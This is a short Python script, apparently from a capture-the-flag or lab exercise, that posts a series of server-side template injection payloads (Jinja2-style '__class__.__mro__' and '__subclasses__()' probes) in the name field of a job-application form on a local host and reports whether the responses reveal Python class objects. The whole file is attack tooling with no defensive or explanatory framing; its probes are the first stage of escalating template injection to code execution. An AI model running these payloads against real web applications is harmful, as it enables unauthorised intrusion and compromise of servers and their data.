import requests
import re

session = requests.Session()
base_url = "http://127.0.0.1:32856"

session.get(f"{base_url}/application")

payloads = [
    "{{''.__class__}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1]}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}"
]

results = []

for payload in payloads:
    data = {
        "name": payload,
        "email": "test@example.com",
        "phone": "1234567890",
        "experience": "5",
        "license": "ABC123"
    }
    
    resp = session.post(f"{base_url}/submit", data=data)
    
    # Extract just the thank you message
    match = re.search(r'Thank you ([^<]+)', resp.text)
    message = match.group(1) if match else "No match"
    
    result = {
        'payload': payload,
        'status': resp.status_code,
        'message': message[:100],  # Limit length
        'has_class': '<class' in resp.text,
        'has_object': 'object' in resp.text
    }
    results.append(result)

# Print summary
for r in results:
    print(f"\nPayload: {r['payload']}")
    print(f"Status: {r['status']}")
    print(f"Message: {r['message']}")
    print(f"SSTI: {r['has_class'] or r['has_object']}")

